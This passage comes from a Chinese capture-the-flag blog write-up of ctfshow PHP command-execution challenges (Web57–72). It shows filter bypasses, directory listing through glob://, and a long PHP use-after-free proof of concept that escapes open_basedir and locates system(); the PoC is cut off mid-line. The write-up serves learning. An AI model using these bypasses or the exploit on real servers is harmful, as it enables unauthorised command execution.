src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302002659.gif" alt="img"></p><blockquote><p>一个很奇怪的点 -1取反再输出是显示的0 要得到一就要在加一个$((~$(())))</p></blockquote><blockquote><p>所以要输出36 需要37个</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">$((~$(())))<br></code></pre></td></tr></table></figure></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302002671.gif" alt="img"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302002039.gif" alt="img"></p><h3 id="Web58"><a href="#Web58" class="headerlink" title="Web58"></a>Web58</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302002184.gif" alt="img"></p><blockquote><p>只能一个一个试过去</p></blockquote><p><img src="file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image018.gif" alt="img"></p><blockquote><p>直接读文件</p></blockquote><h3 id="Web59"><a href="#Web59" class="headerlink" title="Web59"></a>Web59</h3><blockquote><p>跟上题一样，啥也不知道</p></blockquote><p><img src="file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image020.gif" alt="img"></p><blockquote><p>还是直接读就读出来了</p></blockquote><p><img src="file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image022.gif" alt="img"></p><h3 id="Web60"><a href="#Web60" class="headerlink" title="Web60"></a>Web60</h3><p><img src="file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image024.gif" alt="img"></p><p><img src="file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image026.gif" alt="img"></p><h3 id="Web61-62"><a href="#Web61-62" class="headerlink" title="Web61 62"></a>Web61 62</h3><blockquote><p>还是和上一题一样的</p></blockquote><h3 id="Web66"><a href="#Web66" class="headerlink" title="Web66"></a>Web66</h3><p><img src="file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image028.gif" alt="img"></p><blockquote><p>查看目录</p></blockquote><p><img src="file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image030.gif" alt="img"></p><blockquote><p>Print_r和var_dump 作用差不多可以替换</p></blockquote><blockquote><p>2.var_dump()和print_r()的区别</p></blockquote><blockquote><p>共同点：两者都可以打印数组，对象之类的复合型变量。</p></blockquote><blockquote><p>区别：print_r() 只能打印一些易于理解的信息，且print_r()在打印数组时，会将把数组的指针移到最后边，使用 reset() 可让指针回到开始处。 而var_dump()不但能打印复合类型的数据，还能打印资源类型的变量。且var_dump()输出的信息则比较详细，一般调试时用得多。</p></blockquote><p><img src="file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image032.gif" alt="img"></p><h3 id="Web67"><a href="#Web67" class="headerlink" title="Web67"></a>Web67</h3><blockquote><p>和上一题一样</p></blockquote><h3 id="Web68"><a href="#Web68" class="headerlink" title="Web68"></a>Web68</h3><p><img src="file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image034.gif" alt="img"></p><blockquote><p>常规查目录</p></blockquote><p><img src="file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image036.gif" alt="img"></p><blockquote><p>这次禁用了show_source 和highlingt_file</p></blockquote><blockquote><p>用include<img src="file:///C:/Users/23167/AppData/Local/Temp/msohtmlclip1/01/clip_image038.gif" alt="img"></p></blockquote><blockquote><p>然后就RCE</p></blockquote><h3 id="Web70"><a href="#Web70" class="headerlink" title="Web70"></a>Web70</h3><blockquote><p>Var_dump print_r被禁 还可以使用var_export</p></blockquote><blockquote><p>var_export() 函数用于输出或返回一个变量，以字符串形式表示。</p></blockquote><blockquote><p>var_export() 函数返回关于传递给该函数的变量的结构信息，它和 var_dump() 类似，不同的是其返回的是一个合法的 PHP 代码。</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020137.png" alt="image-20230530202004081"></p><blockquote><p>还是一样include方法做</p></blockquote><h3 id="Web71"><a href="#Web71" class="headerlink" title="Web71"></a>Web71</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302034605.png" alt="image-20230530203443557"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020667.gif" alt="img"></p><blockquote><p><a href="https://blog.csdn.net/weixin_34214500/article/details/85920870?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1.pc_relevant_default&utm_relevant_index=2">PHP详解ob_clean,ob_start和ob_get_contents函数</a></p></blockquote><blockquote><p>这道题是先将缓冲区的内容存在s变量中，然后执行清空缓冲区可以忽略前面所有输出，再通过替换输出s变量形成看到的题目。</p></blockquote><blockquote><p>可以用exit（）直接终端进程</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302035672.png" alt="image-20230530203500613"></p><h3 id="Web72"><a href="#Web72" class="headerlink" title="Web72"></a>Web72<img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305302020669.gif" alt="img"></h3><blockquote><p>无权限  用glob伪协议遍历目录 (通用版)</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;glob:///*.txt&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">opendir</span>(<span class="hljs-variable">$a</span>))&#123;<br><span class="hljs-keyword">while</span>((<span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">readdir</span>(<span class="hljs-variable">$b</span>))!==<span class="hljs-literal">false</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;filename:&quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">closedir</span>(<span class="hljs-variable">$b</span>);<br>&#125;<br><span class="hljs-keyword">exit</span>();<br>或者<br>c=<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob://./*&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)<br>&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27; &#x27;</span>);<br>&#125;<br><span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>然后利用uaf漏洞来读取 </p></blockquote><blockquote><p>看了关于uaf漏洞的笔记：<a href="https://blog.csdn.net/musilintan/article/details/116309734?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-116309734-blog-108921661.pc_relevant_paycolumn_v3&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-116309734-blog-108921661.pc_relevant_paycolumn_v3&utm_relevant_index=1">漏洞学习笔记——UAF漏洞_孤月丶星辰的博客-CSDN博客_uaf漏洞</a></p></blockquote><blockquote><p>uaf绕过open_basedir执行命令<br>poc（需要url编码）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ctfshow</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>, <span class="hljs-variable">$backtrace</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Vuln</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123; <br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$backtrace</span>; <br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;a);<br>        <span class="hljs-variable">$backtrace</span> = (<span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>)-&gt;<span class="hljs-title function_ invoke__">getTrace</span>();<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$backtrace</span> = <span class="hljs-title function_ invoke__">debug_backtrace</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span>, <span class="hljs-variable">$d</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str2ptr</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>    <span class="hljs-variable">$address</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-variable">$s</span>-<span class="hljs-number">1</span>; <span class="hljs-variable">$j</span> &gt;= <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span>--) &#123;<br>        <span class="hljs-variable">$address</span> &lt;&lt;= <span class="hljs-number">8</span>;<br>        <span class="hljs-variable">$address</span> |= <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span>+<span class="hljs-variable">$j</span>]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$address</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ptr2str</span>(<span class="hljs-params"><span class="hljs-variable">$ptr</span>, <span class="hljs-variable">$m</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>    <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$m</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$out</span> .= <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;%c&quot;</span>,(<span class="hljs-variable">$ptr</span> &amp; <span class="hljs-number">0xff</span>));<br>        <span class="hljs-variable">$ptr</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span>, <span class="hljs-variable">$v</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>    <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span> + <span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;%c&quot;</span>,(<span class="hljs-variable">$v</span> &amp; <span class="hljs-number">0xff</span>));<br>        <span class="hljs-variable">$v</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>;<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x68</span>, <span class="hljs-variable">$addr</span> + <span class="hljs-variable">$p</span> - <span class="hljs-number">0x10</span>);<br>    <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$helper</span>-&gt;a);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$s</span> != <span class="hljs-number">8</span>) &#123; <span class="hljs-variable">$leak</span> %= <span class="hljs-number">2</span> &lt;&lt; (<span class="hljs-variable">$s</span> * <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>; &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$leak</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parse_elf</span>(<span class="hljs-params"><span class="hljs-variable">$base</span></span>) </span>&#123;<br>    <span class="hljs-variable">$e_type</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">2</span>);<br><br>​    <span class="hljs-variable">$e_phoff</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x20</span>);<br>​    <span class="hljs-variable">$e_phentsize</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">2</span>);<br>​    <span class="hljs-variable">$e_phnum</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">2</span>);<br><br>​    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$e_phnum</span>; <span class="hljs-variable">$i</span>++) &#123;<br>​        <span class="hljs-variable">$header</span> = <span class="hljs-variable">$base</span> + <span class="hljs-variable">$e_phoff</span> + <span class="hljs-variable">$i</span> * <span class="hljs-variable">$e_phentsize</span>;<br>​        <span class="hljs-variable">$p_type</span>  = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>​        <span class="hljs-variable">$p_flags</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>);<br>​        <span class="hljs-variable">$p_vaddr</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x10</span>);<br>​        <span class="hljs-variable">$p_memsz</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x28</span>);<br><br>​        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">6</span>) &#123; <br><br>​            <span class="hljs-variable">$data_addr</span> = <span class="hljs-variable">$e_type</span> == <span class="hljs-number">2</span> ? <span class="hljs-variable">$p_vaddr</span> : <span class="hljs-variable">$base</span> + <span class="hljs-variable">$p_vaddr</span>;<br>​            <span class="hljs-variable">$data_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>​        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">5</span>) &#123; <br>​            <span class="hljs-variable">$text_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>​        &#125;<br>​    &#125;<br><br>​    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$data_addr</span> || !<span class="hljs-variable">$text_size</span> || !<span class="hljs-variable">$data_size</span>)<br>​        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>​    <span class="hljs-keyword">return</span> [<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_basic_funcs</span>(<span class="hljs-params"><span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span></span>) </span>&#123;<br>    <span class="hljs-keyword">list</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>) = <span class="hljs-variable">$elf</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$data_size</span> / <span class="hljs-number">8</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>            <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br>            <br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x746e6174736e6f63</span>)<br>                <span class="hljs-keyword">continue</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>​        <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$data_addr</span>, (<span class="hljs-variable">$i</span> + <span class="hljs-number">4</span>) * <span class="hljs-number">8</span>);<br>​        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>​            <span class="hljs-variable">$deref</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$leak</span>);<br>​            <br>​            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x786568326e6962</span>)<br>​                <span class="hljs-keyword">continue</span>;<br>​        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>​        <span class="hljs-keyword">return</span> <span class="hljs-variable">$data_addr</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>;<br>​    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_binary_base</span>(<span class="hljs-params"><span class="hljs-variable">$binary_leak</span></span>) </span>&#123;<br>    <span class="hljs-variable">$base</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-variable">$start</span> = <span class="hljs-variable">$binary_leak</span> &amp; <span class="hljs-number">0xfffffffffffff000</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x1000</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$start</span> - <span class="hljs-number">0x1000</span> * <span class="hljs-variable">$i</span>;<br>        <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> == <span class="hljs-number">0x10102464c457f</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$addr</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_system</span>(<span class="hljs-params"><span class="hljs-variable">$basic_funcs</span></span>) </span>&#123;<br>    <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$basic_funcs</span>;<br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-variable">$f_entry</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span>);<br>        <span class="hljs-variable">$f_name</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$f_entry</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>);<br><br>​        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$f_name</span> == <span class="hljs-number">0x6d6574737973</span>) &#123;<br>​            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">8</span>);<br>​        &#125;<br>​        <span class="hljs-variable">$addr</span> += <span class="hljs-number">0x20</span>;<br>​    &#125; <span class="hljs-keyword">while</span>(<span class="hljs-variable">$f_entry</span> != <span class="hljs-number">0</span>);<br>​    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">trigger_uaf</span>(<span class="hljs-params"><span class="hljs-variable">$arg</span></span>) </span>&#123;<br><br>​    <span class="hljs-variable">$arg</span> = <span class="hljs-title function_ invoke__">str_shuffle</span>(<span class="hljs-string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);<br>​    <span class="hljs-variable">$vuln</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vuln</span>();<br>​    <span class="hljs-variable">$vuln</span>-&gt;a = <span class="hljs-variable">$arg</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(PHP_OS, <span class="hljs-string">&#x27;WIN&#x27;</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;This PoC is for *nix systems only.&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$n_alloc</span> = <span class="hljs-number">10</span>; <br><span class="hljs-variable">$contiguous</span> = [];<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n_alloc</span>; <span class="hljs-variable">$i</span>++)<br>    <span class="hljs-variable">$contiguous</span>[] = <span class="hljs-title function_ invoke__">str_shuffle</span>(<span class="hljs-string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);<br><br><span class="hljs-title function_ invoke__">trigger_uaf</span>(<span class="hljs-string">&#x27;x&#x27;</span>);<br><span class="hljs-variable">$abc</span> = <span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>][<span class="hljs-number">0</span>];<br><br><span class="hljs-variable">$helper</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Helper</span>;<br><span class="hljs-variable">$helper</span>-&gt;b = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>&#123; &#125;;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">79</span> || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;UAF failed&quot;</span>);<br>&#125;<br><br><span class="hljs-variable">$closure_handlers</span> = <span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$php_heap</span> = <span class="hljs-title function_ 